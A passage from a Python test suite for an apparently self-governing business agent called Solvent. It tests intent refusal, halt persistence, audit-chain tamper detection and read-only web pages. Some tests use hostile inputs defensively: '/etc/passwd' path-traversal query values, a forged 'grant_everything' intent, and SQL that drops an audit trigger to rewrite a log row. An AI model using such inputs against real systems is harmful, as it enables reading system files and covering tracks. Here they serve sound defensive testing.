        proven = {c.name for c in self.solvent.capability.capabilities()
                  if c.proven}
        self.assertNotIn("pdf-extract", proven)

    def test_a_resume_intent_does_not_clear_halt(self):
        from solvent.types import OperatingMode

        self.solvent.policy.set_operating_mode(OperatingMode.HALT, OWNER, "test")
        self.writer.write(verb="resume", requested_by="web:owner", why="x")
        self.consume()
        self.assertIs(self.solvent.policy.operating_mode, OperatingMode.HALT)

    def test_an_enable_real_execution_intent_does_not_enable_it(self):
        self.writer.write(verb="enable_real_execution", requested_by="web:owner",
                          why="x")
        self.consume()
        self.assertTrue(self.solvent.policy.get("egress", "simulation_only",
                                               default=True))

    def test_a_verb_that_is_not_on_the_list_is_refused(self):
        (self.spool / "forged.intent").write_text(
            '{"verb": "grant_everything", "why": "hello"}', encoding="utf-8")
        results = self.consume()
        self.assertEqual(results[0]["outcome"], "REFUSED")
        self.assertIn("not an intent", results[0]["why"])

    def test_an_unreadable_intent_is_refused_and_recorded(self):
        (self.spool / "broken.intent").write_text("not json", encoding="utf-8")
        results = self.consume()
        self.assertEqual(results[0]["outcome"], "REFUSED")
        self.assertIn("unreadable", results[0]["why"])

    def test_a_refusal_names_the_verb_on_the_audit_record(self):
        """An investigator needs to know what was declined, not only that
        something was."""
        self.writer.write(verb="record_contracting", requested_by="web:owner",
                          why="x", subject="anything")
        self.consume()
        rows = [e for e in self.solvent.audit.events()
                if e["event"] == "owner.intent_processed"]
        self.assertEqual(rows[-1]["decision"], "record_contracting")
        self.assertEqual(rows[-1]["result"][:7], "REFUSED")

    def test_a_refused_intent_is_kept_not_deleted(self):
        self.writer.write(verb="record_contracting", requested_by="web:owner",
                          why="x")
        self.consume()
        self.assertTrue(list((self.spool / "refused").glob("*.intent")))

    def test_an_intent_waiting_for_an_approval_stays_in_the_queue(self):
        """Refusing it would throw the owner's own request away, and they
        would have to go back to the website and ask for it again."""
        record = self.writer.write(verb="promote_capability",
                                   requested_by="web:owner", why="x")
        self.consume()
        self.assertEqual([r["id"] for r in self.writer.pending()],
                         [record["id"]])
        self.assertEqual(list((self.spool / "refused").glob("*.intent")), [])

    def test_a_half_written_intent_is_not_read(self):
        (self.spool / "x.intent.partial").write_text("{}", encoding="utf-8")
        self.assertEqual(self.consume(), [])

    def test_the_audit_chain_survives_a_refused_intent(self):
        self.writer.write(verb="promote_capability", requested_by="web:owner",
                          why="x")
        self.consume()
        self.assertTrue(self.solvent.audit.verify_chain()[0])

    def test_an_intent_with_no_reason_cannot_be_written_at_all(self):
        with self.assertRaises(ValueError):
            self.writer.write(verb="halt", requested_by="web:owner", why="   ")

    def test_halting_through_the_spool_survives_a_restart(self):
        from solvent.types import OperatingMode

        self.writer.write(verb="halt", requested_by="web:owner", why="w")
        self.consume()
        self.solvent.store.close()
        restarted = Solvent(self.db)
        try:
            self.assertIs(restarted.policy.operating_mode, OperatingMode.HALT)
        finally:
            restarted.store.close()
            self.solvent = Solvent(self.db)


class TheAuditCheckDetectsTampering(Base):
    """Found by reviewing my own work: this check used to return *intact* when
    the recomputed digest did not match, because the field order was uncertain.
    A security check must not be unsure in that direction — a tampered log would
    have reported clean on the Security page."""

    def tampered_copy(self) -> str:
        import shutil
        import sqlite3 as _sqlite3

        copy = str(self.dir / "tampered.db")
        shutil.copy(self.db, copy)
        conn = _sqlite3.connect(copy)
        conn.execute("PRAGMA writable_schema=ON")
        conn.execute("DROP TRIGGER IF EXISTS audit_log_no_update")
        conn.commit()
        conn.execute("UPDATE audit_log SET why = 'rewritten' "
                     "WHERE seq = (SELECT MAX(seq) FROM audit_log)")
        conn.commit()
        conn.close()
        return copy

    def test_an_untampered_chain_verifies(self):
        intact, note = self.centre.read.audit_chain_intact()
        self.assertTrue(intact, note)
        self.assertIn("verified", note)

    def test_an_edited_row_is_detected(self):
        model = ReadModel(self.tampered_copy())
        try:
            intact, note = model.audit_chain_intact()
            self.assertFalse(intact)
            self.assertIn("hash mismatch", note)
        finally:
            model.close()

    def test_the_security_page_says_broken_when_it_is(self):
        centre = web_server.build(self.tampered_copy(),
                                  password_hash=self.hash, spool=str(self.spool))
        try:
            cookies = self.sign_in(centre=centre)
            body = centre.handle(Request("GET", "/security",
                                         cookies=cookies)).body.decode()
            self.assertIn("BROKEN", body)
        finally:
            centre.read.close()

    def test_the_banner_warns_on_every_page_when_the_chain_is_broken(self):
        centre = web_server.build(self.tampered_copy(),
                                  password_hash=self.hash, spool=str(self.spool))
        try:
            cookies = self.sign_in(centre=centre)
            body = centre.handle(Request("GET", "/",
                                         cookies=cookies)).body.decode()
            self.assertIn("Audit chain problem", body)
        finally:
            centre.read.close()

    def test_the_check_agrees_with_the_audit_logs_own_verdict(self):
        """Two implementations of one rule is a duplicate unless they agree. They
        must, because this one is built field-for-field from the other."""
        solvent = Solvent(self.db)
        try:
            own = solvent.audit.verify_chain()[0]
        finally:
            solvent.store.close()
        self.assertEqual(own, self.centre.read.audit_chain_intact()[0])


class MarkingAMessageRelayedActuallyClearsIt(unittest.TestCase):
    """Also found by review: the handler returned a sentence and changed
    nothing, so the message stayed in the queue and the owner would have sent it
    twice. A queue that cannot be cleared is worse than no queue."""

    def setUp(self):
        self.dir = pathlib.Path(tempfile.mkdtemp())
        self.db = str(self.dir / "solvent.db")
        self.spool = pathlib.Path(tempfile.mkdtemp())
        self.solvent = promoted(Solvent(self.db))
        source, work = workspace(CLIENT_FILE)
        report = run_csv_job(source=source, requirements=list(AGREED),
                             workdir=work, solvent=self.solvent,
                             client_id="client:one", title="t")
        self.job_id = report.job_id
        self.solvent.relations.handle(job_id=report.job_id,
                                      body="when is it ready?", source=source)
        self.draft = [r for r in self.solvent.relations.responses(report.job_id)
                      if r["phase"] == "PREPARED"][0]["id"]

    def tearDown(self):
        self.solvent.store.close()

    def relay(self, subject):
        from solvent.harness import consume_owner_intents

        web_intents.IntentWriter(str(self.spool)).write(
            verb="mark_relayed", requested_by="web:owner", why="I emailed it",
            subject=subject)
        return consume_owner_intents(self.solvent, spool=str(self.spool))

    def test_it_leaves_the_relay_queue(self):
        self.assertEqual(self.relay(self.draft)[0]["outcome"],
                         "recorded as relayed by the owner")
        remaining = [r for r in self.solvent.relations.responses(self.job_id)
                     if r["phase"] == "PREPARED"]
        self.assertEqual(remaining, [])

    def test_the_website_queue_empties_too(self):
        self.relay(self.draft)
        self.solvent.store.close()
        model = ReadModel(self.db)
        try:
            self.assertEqual(model.relay_queue(), [])
        finally:
            model.close()
            self.solvent = Solvent(self.db)

    def test_it_is_recorded_as_sent_by_a_person_not_by_solvent(self):
        """The distinction matters: Solvent did not perform an external effect,
        and the record must not say it did."""
        self.relay(self.draft)
        rows = [e for e in self.solvent.audit.events()
                if e["event"] == "relations.relayed_by_owner"]
        self.assertTrue(rows)
        self.assertIn("by a person", rows[-1]["external_effect"])

    def test_no_external_action_was_attempted(self):
        self.relay(self.draft)
        self.assertEqual(self.solvent.gate.unsettled(), [])

    def test_an_unknown_response_id_is_refused(self):
        self.assertEqual(self.relay("nope_does_not_exist")[0]["outcome"],
                         "REFUSED")

    def test_marking_it_twice_is_harmless(self):
        self.relay(self.draft)
        self.assertNotEqual(self.relay(self.draft)[0]["outcome"], "REFUSED")

    def test_a_message_the_gate_released_cannot_also_be_hand_relayed(self):
        """That would make the record say it went twice."""
        from solvent.errors import FailClosed as _FailClosed

        connection = self.solvent.store.for_authority("relations")
        connection.execute("UPDATE client_responses SET phase = 'SENT' "
                           "WHERE id = ?", (self.draft,))
        connection.commit()
        with self.assertRaises(_FailClosed):
            self.solvent.relations.mark_relayed(response_id=self.draft,
                                                by="owner:x")


class TheFilesPage(Base):
    """§38. The deliverables are listed. They are not served.

    The distinction is the whole page. A client's finished work is the most
    confidential thing Solvent holds, and this is the one process that listens
    on a socket. Listing what exists costs nothing if a session is stolen;
    streaming it would turn the same theft into a data breach.
    """

    def test_it_lists_the_files_that_were_produced(self):
        body = self.get("/files", self.sign_in()).body.decode()
        self.assertIn("Files and deliverables", body)
        self.assertIn("client:one", body)
        self.assertIn("client:two", body)

    def test_it_shows_verification_against_each_files_own_digest(self):
        body = self.get("/files", self.sign_in()).body.decode()
        self.assertIn("passing", body)

    def test_it_does_not_contain_the_contents_of_any_deliverable(self):
        """The page names files; it never carries one."""
        body = self.get("/files", self.sign_in()).body.decode()
        rows = self.centre.read.deliverables()
        self.assertTrue(rows, "the fixture produced no artifacts to test with")
        for row in rows:
            path = pathlib.Path(row["path"])
            if not path.exists():
                continue
            content = path.read_text(encoding="utf-8", errors="replace")
            for line in content.splitlines():
                if len(line.strip()) > 12:
                    self.assertNotIn(line.strip(), body,
                                     "a deliverable's contents reached the page")

    def test_there_is_no_route_that_serves_a_file(self):
        """Every route answers with a page. None of them answers with a file."""
        cookies = self.sign_in()
        for route in sorted(self.centre._routes()):
            with self.subTest(route=route):
                response = self.centre.handle(Request(
                    "GET", route, cookies=cookies,
                    query={"id": self.job_id, "path": "/etc/passwd",
                           "file": "/etc/passwd", "download": "1"}))
                self.assertNotIn(b"root:x:0:0", response.body)
                headers = dict(response.headers)
                self.assertTrue(
                    headers.get("Content-Type", "").startswith("text/html"),
                    f"{route} answered with {headers.get('Content-Type')!r}")
                self.assertNotIn("Content-Disposition", headers,
                                 f"{route} offered a download")

    def test_a_filter_cannot_reach_another_clients_files(self):
        """Filtering is a WHERE clause on a read-only connection, so the worst
        a crafted filter does is return nothing."""
        cookies = self.sign_in()
        body = self.get("/files", cookies, client="client:two").body.decode()
        self.assertIn("client:two", body)
        self.assertNotIn("client:one", body)

    def test_a_hostile_filter_value_is_escaped_not_executed(self):
        cookies = self.sign_in()
        for hostile in MARKUP_PAYLOADS:
            with self.subTest(hostile=hostile[:24]):
                body = self.get("/files", cookies, client=hostile).body.decode()
                self.assertNotIn(hostile, body)

    def test_the_page_cannot_write(self):
        before = self.centre.read.deliverables()
        self.get("/files", self.sign_in())
        self.assertEqual(self.centre.read.deliverables(), before)

    def test_an_unverified_file_is_not_shown_as_verified(self):
        for row in self.centre.read.deliverables():
            counts = self.centre.read.deliverable_verification(row["digest"])
            with self.subTest(digest=row["digest"][:12]):
                self.assertEqual(counts["total"],
                                 counts["passed"] + counts["failed"])

    def test_verification_is_scoped_to_the_digest_not_the_job(self):
        """Evidence for a previous version of a file is not evidence for this
        one, and the page must not inherit it."""
        self.assertEqual(
            self.centre.read.deliverable_verification("not-a-real-digest"),
            {"passed": 0, "failed": 0, "total": 0})


class TheLearningPage(Base):
    """§83. What Solvent concluded, and what it concluded it from."""

    def test_it_names_what_was_learned_and_where_it_came_from(self):
        body = self.get("/learning", self.sign_in()).body.decode()
        self.assertIn("What Solvent has learned", body)
        self.assertIn("checklist_pattern", body)
        self.assertIn("job_economics", body)
        self.assertIn(self.job_id[:18], body)

    def test_an_economic_lesson_is_shown_at_the_grade_it_required(self):
        """Memory refuses economic learning below an external fact. The page
        is where the owner can see that rule having held."""
        body = self.get("/learning", self.sign_in(),
                        kind="job_economics").body.decode()
        self.assertIn("T3_EXTERNAL_FACT", body)
        self.assertIn("quoted_cents", body)
        # The summary index still lists every kind, because that is how the
        # owner navigates between them. What must be filtered is the lessons.
        self.assertNotIn("commonest defect", body,
                         "the filter did not narrow the lessons themselves")

    def test_every_lesson_is_shown_with_its_evidence_grade(self):
        rows = self.centre.read.lessons()
        self.assertTrue(rows, "the fixture learned nothing, so this proves "
                              "nothing about how lessons are shown")
        body = self.get("/learning", self.sign_in()).body.decode()
        for row in rows:
            with self.subTest(lesson=row["id"]):
                self.assertIn(esc_of(row["tier"]), body)

    def test_the_page_cannot_write_a_lesson(self):
        """Memory is the only writer. A second one would let the component
        whose autonomy depends on looking successful edit its own record."""
        before = self.centre.read.lessons()
        self.get("/learning", self.sign_in())
        self.get("/learning", self.sign_in(), kind="job_outcome")
        self.assertEqual(self.centre.read.lessons(), before)

    def test_a_hostile_kind_filter_is_escaped_and_returns_nothing(self):
        cookies = self.sign_in()
        for hostile in MARKUP_PAYLOADS:
            with self.subTest(hostile=hostile[:24]):
                body = self.get("/learning", cookies, kind=hostile).body.decode()
                self.assertNotIn(hostile, body)

    def test_the_kind_filter_narrows_rather_than_widens(self):
        all_rows = self.centre.read.lessons()
        self.assertGreater(len(all_rows), 1)
        for row in all_rows[:3]:
            narrowed = self.centre.read.lessons(kind=row["kind"])
            with self.subTest(kind=row["kind"]):
                self.assertTrue(narrowed)
                self.assertTrue(all(r["kind"] == row["kind"] for r in narrowed))
                self.assertLessEqual(len(narrowed), len(all_rows))


def esc_of(value: str) -> str:
    from solvent.web.render import esc
    return esc(value)
